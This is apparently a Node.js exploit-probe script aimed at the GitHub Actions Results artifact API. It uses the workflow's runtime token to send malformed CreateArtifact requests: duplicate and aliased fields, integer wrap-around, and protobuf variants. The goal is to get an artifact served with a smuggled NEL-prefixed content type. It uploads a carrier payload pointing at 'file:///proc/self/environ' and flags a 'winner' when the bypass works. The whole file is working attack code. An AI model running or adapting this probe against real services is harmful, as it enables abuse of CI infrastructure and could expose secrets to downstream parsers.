'use strict';

// Minimal parser-confusion probe for Actions Results CreateArtifact.  The
// matrix is intentionally small and logs no signed URLs or bearer tokens.

const crypto = require('node:crypto');
const https = require('node:https');

const SERVICE = 'github.actions.results.api.v1.ArtifactService';
const ODD_TYPE = '\x85application/json';
const ODD_HEX = Buffer.from(ODD_TYPE, 'latin1').toString('hex');

function fail(message) { throw new Error(message); }

function backendIds(token) {
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
  const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
  const fields = scope?.split(':') || [];
  if (fields.length !== 3) fail('Actions.Results scope unavailable');
  return {run: fields[1], job: fields[2]};
}

function request(url, {method = 'GET', headers = {}, body = null} = {}) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, {method, headers}, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({
        status: response.statusCode || 0,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.setTimeout(20000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

async function twirpRaw(method, token, body, contentType = 'application/json') {
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  return request(`${origin}/twirp/${SERVICE}/${method}`, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      accept: contentType,
      'content-type': contentType,
      'content-length': String(body.length),
    },
    body,
  });
}

async function twirpJson(method, token, value) {
  const response = await twirpRaw(method, token, Buffer.from(JSON.stringify(value)));
  let parsed = {};
  try { parsed = JSON.parse(response.body.toString()); } catch {}
  return {response, parsed};
}

function varint(value) {
  let n = BigInt(value);
  const out = [];
  while (n >= 0x80n) {
    out.push(Number(n & 0x7fn) | 0x80);
    n >>= 7n;
  }
  out.push(Number(n));
  return Buffer.from(out);
}

function fieldString(no, value) {
  const data = Buffer.from(value);
  return Buffer.concat([varint((no << 3) | 2), varint(data.length), data]);
}

function fieldInt(no, value) {
  return Buffer.concat([varint(no << 3), varint(value)]);
}

function fieldMime(value) {
  const wrapped = fieldString(1, value);
  return Buffer.concat([varint((6 << 3) | 2), varint(wrapped.length), wrapped]);
}

function binaryCreate(ids, name, fields) {
  return Buffer.concat([
    fieldString(1, ids.run),
    fieldString(2, ids.job),
    fieldString(3, name),
    ...fields,
  ]);
}

function parseCreate(response, binary) {
  if (!binary) {
    try { return JSON.parse(response.body.toString()); } catch { return {}; }
  }
  const body = response.body;
  let pos = 0;
  let ok = false;
  let signedUploadUrl = '';
  function readVarint() {
    let value = 0n;
    let shift = 0n;
    while (pos < body.length) {
      const byte = body[pos++];
      value |= BigInt(byte & 0x7f) << shift;
      if (!(byte & 0x80)) return value;
      shift += 7n;
    }
    throw new Error('truncated protobuf');
  }
  while (pos < body.length) {
    const tag = Number(readVarint());
    const no = tag >>> 3;
    const wire = tag & 7;
    if (wire === 0) {
      const value = readVarint();
      if (no === 1) ok = value !== 0n;
    } else if (wire === 2) {
      const length = Number(readVarint());
      const data = body.subarray(pos, pos + length);
      pos += length;
      if (no === 2) signedUploadUrl = data.toString();
    } else {
      throw new Error(`unsupported response wire type ${wire}`);
    }
  }
  return {ok, signed_upload_url: signedUploadUrl};
}

async function putBlob(url, body) {
  return request(url, {
    method: 'PUT',
    headers: {
      'content-type': 'application/octet-stream',
      'content-length': String(body.length),
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': ODD_TYPE,
    },
    body,
  });
}

function carrier(repositoryPath) {
  return Buffer.from(JSON.stringify({
    full_name: repositoryPath,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette parser probe carrier',
    stargazers_count: 0,
  }));
}

function headerHex(response) {
  const value = Array.isArray(response.headers['content-type'])
    ? response.headers['content-type'][0] : response.headers['content-type'] || '';
  return Buffer.from(value, 'latin1').toString('hex');
}

async function finish(label, create, token, ids, name, repository) {
  const uploadUrl = create.signed_upload_url || create.signedUploadUrl || '';
  if (!create.ok || !uploadUrl) return {label, accepted: false};
  const placeholder = Buffer.from('{}');
  const put = await putBlob(uploadUrl, placeholder);
  const finalized = await twirpJson('FinalizeArtifact', token, {
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name,
    size: String(placeholder.length),
  });
  const artifactId = String(finalized.parsed.artifact_id || finalized.parsed.artifactId || '');
  if (put.status < 200 || put.status >= 300 || !/^\d+$/.test(artifactId)) {
    return {label, accepted: true, putStatus: put.status, finalizeStatus: finalized.response.status};
  }
  const repositoryPath = `${repository}/actions/artifacts/${artifactId}/zip`;
  const body = carrier(repositoryPath);
  await putBlob(uploadUrl, body);
  const signed = await twirpJson('GetSignedArtifactURL', token, {
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name,
  });
  const downloadUrl = signed.parsed.signed_url || signed.parsed.signedUrl || '';
  const direct = downloadUrl ? await request(downloadUrl, {headers: {'user-agent': 'repo-cassette-parser-probe'}}) : null;
  const contentTypeHex = direct ? headerHex(direct) : '';
  const result = {
    label,
    accepted: true,
    createOk: true,
    artifactId,
    repositoryPath,
    directStatus: direct?.status || 0,
    contentTypeHex,
    bodyMatch: Boolean(direct?.body.equals(body)),
  };
  result.winner = result.directStatus === 200 && result.contentTypeHex === ODD_HEX && result.bodyMatch;
  return result;
}

async function main() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const repository = process.env.GITHUB_REPOSITORY;
  if (!token || !repository) fail('Actions environment incomplete');
  const ids = backendIds(token);
  const nonce = `${process.env.GITHUB_RUN_ID}-${crypto.randomBytes(4).toString('hex')}`;
  const q = JSON.stringify;
  const base = (name) => `"workflow_run_backend_id":${q(ids.run)},"workflow_job_run_backend_id":${q(ids.job)},"name":${q(name)}`;
  const jsonSpecs = [
    ['json-control-v7-nel', (n) => `{${base(n)},"version":7,"mime_type":${q(ODD_TYPE)}}`],
    ['json-version-6-then-7', (n) => `{${base(n)},"version":6,"version":7,"mime_type":${q(ODD_TYPE)}}`],
    ['json-version-7-then-6', (n) => `{${base(n)},"version":7,"version":6,"mime_type":${q(ODD_TYPE)}}`],
    ['json-mime-valid-alias-nel', (n) => `{${base(n)},"version":7,"mime_type":"application/json","mimeType":${q(ODD_TYPE)}}`],
    ['json-mime-nel-alias-valid', (n) => `{${base(n)},"version":7,"mime_type":${q(ODD_TYPE)},"mimeType":"application/json"}`],
    ['json-mime-valid-then-nel', (n) => `{${base(n)},"version":7,"mime_type":"application/json","mime_type":${q(ODD_TYPE)}}`],
    ['json-mime-nel-then-valid', (n) => `{${base(n)},"version":7,"mime_type":${q(ODD_TYPE)},"mime_type":"application/json"}`],
    ['json-wrapper-object', (n) => `{${base(n)},"version":7,"mime_type":{"value":${q(ODD_TYPE)}}}`],
    ['json-version-string', (n) => `{${base(n)},"version":"7","mime_type":${q(ODD_TYPE)}}`],
    ['json-version-float', (n) => `{${base(n)},"version":7.0,"mime_type":${q(ODD_TYPE)}}`],
    ['json-version-rounds-to-7', (n) => `{${base(n)},"version":6.9999999999999996,"mime_type":${q(ODD_TYPE)}}`],
    ['json-version-wrap-high', (n) => `{${base(n)},"version":4294967303,"mime_type":${q(ODD_TYPE)}}`],
  ];
  const binarySpecs = [
    ['proto-version-6-then-7', [fieldInt(5, 6), fieldInt(5, 7), fieldMime(ODD_TYPE)]],
    ['proto-version-7-then-6', [fieldInt(5, 7), fieldInt(5, 6), fieldMime(ODD_TYPE)]],
    ['proto-version-wrap-high', [fieldInt(5, 4294967303n), fieldMime(ODD_TYPE)]],
    ['proto-mime-valid-then-nel', [fieldInt(5, 7), fieldMime('application/json'), fieldMime(ODD_TYPE)]],
    ['proto-mime-nel-then-valid', [fieldInt(5, 7), fieldMime(ODD_TYPE), fieldMime('application/json')]],
  ];
  const results = [];
  for (const [index, spec] of [...jsonSpecs, ...binarySpecs].entries()) {
    const [label, make] = spec;
    const name = `repo-cassette-parser-${nonce}-${index}`;
    const binary = index >= jsonSpecs.length;
    const body = binary ? binaryCreate(ids, name, make) : Buffer.from(make(name));
    const response = await twirpRaw('CreateArtifact', token, body, binary ? 'application/protobuf' : 'application/json');
    let create = {};
    try { create = parseCreate(response, binary); } catch (error) { create = {parseError: error.message}; }
    const errorText = response.status >= 400 ? response.body.toString().slice(0, 500) : '';
    const row = {
      label,
      encoding: binary ? 'protobuf' : 'json',
      createStatus: response.status,
      createOk: Boolean(create.ok),
      error: errorText,
      ...await finish(label, create, token, ids, name, repository),
    };
    results.push(row);
    console.log(`PARSER_RESULT ${JSON.stringify(row)}`);
    if (row.winner) {
      console.log(`PARSER_WINNER ${JSON.stringify(row)}`);
      return;
    }
  }
  const control = results.find(x => x.label === 'json-control-v7-nel');
  console.log(`PARSER_SUMMARY ${JSON.stringify({tested: results.length, invalidMimeControl: control})}`);
}

main().catch(error => {
  console.error(error.stack || error);
  process.exitCode = 1;
});
